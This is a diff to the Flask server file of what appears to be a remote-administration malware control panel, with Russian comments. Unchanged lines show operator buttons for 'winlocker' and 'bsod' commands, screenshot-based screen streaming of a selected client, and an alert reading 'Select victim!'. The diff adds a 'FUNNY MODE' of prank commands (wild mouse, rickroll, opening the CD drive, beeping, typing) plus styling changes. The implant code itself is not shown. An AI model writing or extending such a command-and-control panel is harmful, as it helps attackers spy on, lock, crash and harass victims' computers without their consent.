@@ -1,5 +1,5 @@
 # =====================================================================
-# СЕРВЕР - С ИНФО О СТРАНЕ
+# СЕРВЕР С ПРИКОЛЬНЫМИ ФУНКЦИЯМИ
 # Замени server.py на GitHub
 # =====================================================================
 from flask import Flask, request, jsonify
@@ -121,13 +121,11 @@ def get_notifications():
 
 @app.route('/')
 def home():
-    # Тот же HTML что в прошлом ответе, но с отображением страны
-    # Берём HTML из предыдущего сообщения и добавляем country в отображение
     return """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Control Panel v2.0</title>
+    <title>Control Panel v3.0 - FUNNY MODE</title>
     <meta charset="UTF-8">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -135,8 +133,8 @@ def home():
         @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(79,195,247,0.4); } 70% { box-shadow: 0 0 0 10px rgba(79,195,247,0); } 100% { box-shadow: 0 0 0 0 rgba(79,195,247,0); } }
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes glow { 0%, 100% { border-color: #2d3a4a; } 50% { border-color: #4fc3f7; } }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        @keyframes rainbow { 0% { color: #ff0000; } 14% { color: #ff8800; } 28% { color: #ffff00; } 42% { color: #00ff00; } 57% { color: #0088ff; } 71% { color: #0000ff; } 85% { color: #8800ff; } 100% { color: #ff0000; } }
+        @keyframes shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         
         body { background: #0a0e14; color: #c9d1d9; font-family: 'Segoe UI', system-ui; height: 100vh; display: flex; overflow: hidden; }
         
@@ -153,48 +151,49 @@ def home():
         .client-list { flex: 1; overflow-y: auto; padding: 10px; }
         .client-item { background: #0d1520; border: 2px solid #1e2d3d; border-radius: 10px; padding: 14px; margin-bottom: 8px; cursor: pointer; transition: all 0.3s ease; animation: fadeIn 0.4s ease; }
         .client-item:hover { border-color: #4fc3f7; transform: translateX(5px); background: #111d2b; }
-        .client-item.active { border-color: #4fc3f7; background: #111d2b; animation: glow 2s infinite; }
+        .client-item.active { border-color: #4fc3f7; background: #111d2b; }
         .client-item .name { color: #4fc3f7; font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
         .client-item .info { color: #8b949e; font-size: 10px; margin-top: 4px; line-height: 1.5; }
         .dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; animation: pulse 2s infinite; }
         
         .main-content { flex: 1; display: flex; flex-direction: column; }
         
-        .toolbar { background: #111922; padding: 12px 20px; display: flex; gap: 8px; flex-wrap: wrap; border-bottom: 1px solid #1e2d3d; animation: fadeIn 0.5s ease; }
-        .toolbar button { background: #1a2733; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 8px 14px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 500; transition: all 0.3s ease; }
-        .toolbar button:hover { background: #4fc3f7; color: #0f1923; border-color: #4fc3f7; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(79,195,247,0.3); }
+        .toolbar { background: #111922; padding: 12px 20px; display: flex; gap: 6px; flex-wrap: wrap; border-bottom: 1px solid #1e2d3d; }
+        .toolbar button { background: #1a2733; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 7px 12px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 500; transition: all 0.3s ease; }
+        .toolbar button:hover { background: #4fc3f7; color: #0f1923; border-color: #4fc3f7; transform: translateY(-2px); }
         .toolbar button:active { transform: scale(0.95); }
         .toolbar button.danger { color: #ef5350; border-color: #ef5350; }
-        .toolbar button.danger:hover { background: #ef5350; color: #fff; box-shadow: 0 5px 15px rgba(239,83,80,0.3); }
+        .toolbar button.danger:hover { background: #ef5350; color: #fff; }
         .toolbar button.green { color: #81c784; border-color: #81c784; }
-        .toolbar button.green:hover { background: #81c784; color: #0f1923; box-shadow: 0 5px 15px rgba(129,199,132,0.3); }
+        .toolbar button.green:hover { background: #81c784; color: #0f1923; }
+        .toolbar button.funny { color: #ffaa00; border-color: #ffaa00; animation: shake 0.5s infinite; }
+        .toolbar button.funny:hover { background: #ffaa00; color: #000; animation: none; }
+        .toolbar button.rainbow { animation: rainbow 3s infinite; border-color: #ffaa00; }
+        .toolbar button.rainbow:hover { background: #fff; animation: none; }
         
         .content-area { flex: 1; display: flex; padding: 10px; gap: 10px; overflow: hidden; }
         
-        .panel { background: #111922; border-radius: 12px; border: 1px solid #1e2d3d; animation: fadeIn 0.6s ease; }
+        .panel { background: #111922; border-radius: 12px; border: 1px solid #1e2d3d; }
         .screenshot-panel { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .screenshot-panel img { max-width: 100%; max-height: 100%; object-fit: contain; animation: fadeIn 0.3s ease; }
+        .screenshot-panel img { max-width: 100%; max-height: 100%; object-fit: contain; }
         .placeholder { color: #3a4a5a; font-size: 16px; text-align: center; }
-        .spinner { width: 40px; height: 40px; border: 3px solid #1e2d3d; border-top: 3px solid #4fc3f7; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
         
         .info-panel { width: 380px; padding: 20px; overflow-y: auto; }
         .info-panel h3 { color: #4fc3f7; font-size: 14px; margin-bottom: 10px; margin-top: 15px; }
         .info-panel h3:first-child { margin-top: 0; }
-        .info-row { display: flex; padding: 6px 0; border-bottom: 1px solid #1a2733; font-size: 12px; animation: fadeIn 0.3s ease; }
+        .info-row { display: flex; padding: 6px 0; border-bottom: 1px solid #1a2733; font-size: 12px; }
         .info-label { color: #8b949e; width: 100px; flex-shrink: 0; font-weight: 500; }
         .info-value { color: #e6edf3; }
         pre { background: #0a0e14; padding: 12px; border-radius: 8px; font-size: 11px; color: #81c784; white-space: pre-wrap; max-height: 200px; overflow-y: auto; border: 1px solid #1e2d3d; }
         
         .console-panel { width: 320px; background: #0a0e14; display: flex; flex-direction: column; }
         .console-header { padding: 10px 15px; font-size: 12px; color: #4fc3f7; border-bottom: 1px solid #1e2d3d; font-weight: 600; }
-        .console-output { flex: 1; overflow-y: auto; padding: 10px; font-family: 'Cascadia Code', 'Consolas', monospace; font-size: 11px; color: #81c784; }
+        .console-output { flex: 1; overflow-y: auto; padding: 10px; font-family: 'Consolas', monospace; font-size: 11px; color: #81c784; }
         .console-input { display: flex; border-top: 1px solid #1e2d3d; }
-        .console-input input { flex: 1; background: #0a0e14; border: none; color: #81c784; padding: 10px 12px; font-family: 'Consolas', monospace; font-size: 11px; outline: none; }
-        .console-input button { background: #4fc3f7; color: #0a0e14; border: none; padding: 10px 16px; cursor: pointer; font-weight: 700; transition: all 0.3s; }
-        .console-input button:hover { background: #81c784; }
+        .console-input input { flex: 1; background: #0a0e14; border: none; color: #81c784; padding: 10px; font-family: 'Consolas', monospace; font-size: 11px; outline: none; }
+        .console-input button { background: #4fc3f7; color: #0a0e14; border: none; padding: 10px 16px; cursor: pointer; font-weight: 700; }
         
-        .log-entry { padding: 3px 0; font-size: 10px; animation: fadeIn 0.2s ease; }
-        .log-entry .time { color: #4fc3f7; margin-right: 6px; }
+        .section-title { color: #ffaa00; font-size: 11px; font-weight: 600; margin: 8px 0 4px 0; }
         
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #0a0e14; }
@@ -204,7 +203,7 @@ def home():
 <body>
     <div class="sidebar">
         <div class="sidebar-header">
-            <h2>⬡ CONTROL PANEL v2.0</h2>
+            <h2>⬡ CONTROL PANEL v3.0</h2>
             <div class="status"><span class="status-dot"></span> Server Online</div>
         </div>
         <div class="notifications" id="notifications"></div>
@@ -228,6 +227,17 @@ def home():
             <button onclick="sendMsg()">💬 Msg</button>
             <button class="danger" onclick="sendCmd('winlocker')">🚫 WinLock</button>
             <button class="danger" onclick="sendCmd('bsod')">⚠ BSOD</button>
+            
+            <div class="section-title" style="width:100%">😂 FUNNY COMMANDS:</div>
+            
+            <button class="funny" onclick="sendCmd('funny_msg')">😂 Смешное окно</button>
+            <button class="funny" onclick="sendCmd('crazy_screen')">🤪 Безумный экран</button>
+            <button class="funny" onclick="sendCmd('crazy_mouse')">🖱 Мышь-псих</button>
+            <button class="funny" onclick="sendCmd('rickroll')">🎵 RickRoll</button>
+            <button class="funny" onclick="sendCmd('draw')">🎨 Рисовать</button>
+            <button class="funny" onclick="sendCmd('beep')">🔊 Пищать</button>
+            <button class="funny" onclick="sendCmd('cdrom')">💿 Дисковод</button>
+            <button class="rainbow" onclick="sendCmd('type_funny')">⌨️ Печатать</button>
         </div>
         
         <div class="content-area">
@@ -329,7 +339,6 @@ def home():
             if(!selectedClient) { alert('Select victim!'); return; }
             sendCmd('stream_start');
             log('📡 Stream started');
-            document.getElementById('screenPanel').innerHTML = '<div class="spinner"></div>';
             if(streamInterval) clearInterval(streamInterval);
             streamInterval = setInterval(() => { sendCmd('screenshot'); setTimeout(updateAll, 1500); }, 2000);
         }
@@ -370,7 +379,7 @@ def home():
         
         setInterval(updateAll, 2000);
         updateAll();
-        log('🚀 Panel ready');
+        log('🚀 Panel ready - FUNNY MODE activated! 😂');
     </script>
 </body>
 </html>
